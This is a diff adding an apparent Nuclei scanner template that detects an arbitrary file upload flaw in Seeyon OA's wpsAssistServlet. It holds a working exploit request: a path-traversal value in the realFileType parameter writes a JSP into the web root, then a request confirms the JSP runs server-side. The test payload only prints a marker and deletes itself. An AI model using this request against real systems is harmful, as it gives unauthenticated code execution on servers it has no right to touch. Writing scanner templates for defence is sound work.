@@ -1,0 +1,51 @@
+id: seeyon-oa-wpsassistservlet-realfiletype-writefile
+info:
+  name: Seeyon OA WPSAssistServlet Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects an arbitrary file upload vulnerability in the Seeyon OA
+    WPSAssistServlet endpoint that allows uploading and executing JSP files.
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20wpsAssistServlet%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+
+variables:
+  s1: "{{rand_int(1000000000, 9000000000)}}"
+  s2: "{{rand_text_alpha(20)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{s2}}.jsp&fileId=2"
+    headers:
+      Content-Type: "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b"
+    body: |
+      --59229605f98b8cf290a7b8908b34616b
+      Content-Disposition: form-data; name="upload"; filename="123.xls"
+      Content-Type: application/vnd.ms-excel
+
+      <% out.println("{{s1}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+      --59229605f98b8cf290a7b8908b34616b--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+
+  - id: verify-file
+    method: GET
+    path:
+      - "/{{s2}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{s1}}"
+        part: body
